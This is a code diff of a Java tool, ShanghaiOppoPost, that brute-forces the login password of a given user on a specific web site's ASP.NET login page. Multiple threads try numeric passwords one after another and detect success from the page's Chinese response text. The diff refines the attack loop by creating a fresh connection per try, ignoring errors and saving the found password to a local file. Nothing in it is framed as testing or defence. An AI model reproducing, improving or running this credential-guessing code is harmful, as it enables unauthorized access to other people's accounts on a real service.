@@ -10,8 +10,9 @@ import org.jsoup.select.Elements;
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
-import java.io.IOException;
 import java.util.HashMap;
+import java.util.Map;
+import java.util.concurrent.ConcurrentHashMap;
 
 /**
  * @author LSY
@@ -21,8 +22,8 @@ import java.util.HashMap;
 public class ShanghaiOppoPost {
 
 
-    static String defeated = "错误的用户名或密码！";
-    static String success = "请选择功能:";
+    private static String defeated = "错误的用户名或密码！";
+    private static String success = "请选择功能:";
 
     /**
      * 递增暴力破译密码
@@ -35,7 +36,7 @@ public class ShanghaiOppoPost {
     private void checkPwd(String name, int threadNum, int num, Long start) {
         String url = "http://shoppo.nesdo.cn/Login_Wap.aspx";
         HashMap<String, String> headers = new HashMap<>();
-        HashMap<String, String> datas = new HashMap<>();
+        Map<String, String> datas = new ConcurrentHashMap<>();
         headers.put("Content-Type", "application/x-www-form-urlencoded");
         headers.put("Accept-Encoding", "gzip, deflate");
         headers.put("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
@@ -48,48 +49,56 @@ public class ShanghaiOppoPost {
         datas.put("__EVENTTARGET", "");
         datas.put("__EVENTARGUMENT", "");
         datas.put("CmdLogin", "登录");
-        Connection connect = Jsoup.connect(url);
+
         long count = start + num;
         datas.put("TbUser", name);
         String pwd;
         while (true) {
-            pwd = String.valueOf(count);
+            Connection connect = Jsoup.connect(url);
+            pwd = PwdUtils.getNumPwd(count);
+            System.out.println(pwd);
             datas.put("TbPass", pwd);
             Connection connection = connect.headers(headers).data(datas);
             Document post = null;
             try {
                 post = connection.post();
-            } catch (IOException e) {
-                e.printStackTrace();
+                assert post != null;
+                Elements fonts = post.body().select("font");
+                boolean isDefeated = fonts.stream().anyMatch(f -> f.toString().contains(defeated));
+                if (isDefeated) {
+                    count += threadNum;
+                } else if (fonts.stream().anyMatch(f -> f.toString().contains(success))) {
+                    // 成功试出密码
+                    success(pwd);
+                }
+            } catch (Exception ignored) {
+
             }
-            assert post != null;
-            Elements fonts = post.body().select("font");
-            boolean isDefeated = fonts.stream().anyMatch(f -> f.toString().contains(defeated));
-            if (isDefeated) {
-                System.out.println(pwd);
-                count += threadNum;
-            } else if (fonts.stream().anyMatch(f -> f.toString().contains(success))){
-                // 成功试出密码
-                success(pwd);
-            }
+
         }
 
 
     }
 
-    private void success(String p) {
+    /**
+     * 成功后的处理
+     *
+     * @param pwd 密码
+     */
+    private void success(String pwd) {
         try {
-            System.out.println("!!!!!!!!!!!!!!!!!!" + p);
-            File file = new File("C:\\Users\\lsy\\IdeaProjects\\pc\\src\\main\\resources\\txt\\pwd2.txt");
+            System.out.println("!!!!!!!!!!!!!!!!!!" + pwd);
+            File file = new File("F:\\MyTest\\pc\\src\\main\\resources\\txt\\json2.txt");
             file.exists();
             BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(file));
-            bufferedWriter.write(p);
+            bufferedWriter.write(pwd);
             bufferedWriter.flush();
             bufferedWriter.close();
+            System.exit(0);
         } catch (Exception e) {
-            throw new RuntimeException("密码为:" + p);
+            throw new RuntimeException("密码为:" + pwd);
         }
-        throw new RuntimeException("密码为:" + p);
+        throw new RuntimeException("密码为:" + pwd);
     }
 
     public void checkPwd(String name, int threadNum, Long start) {
@@ -105,7 +114,7 @@ public class ShanghaiOppoPost {
         private int num;
         private Long start;
 
-        public OppoThread(String name, int threadNum, int num, Long start) {
+        OppoThread(String name, int threadNum, int num, Long start) {
             this.name = name;
             this.threadNum = threadNum;
             this.num = num;
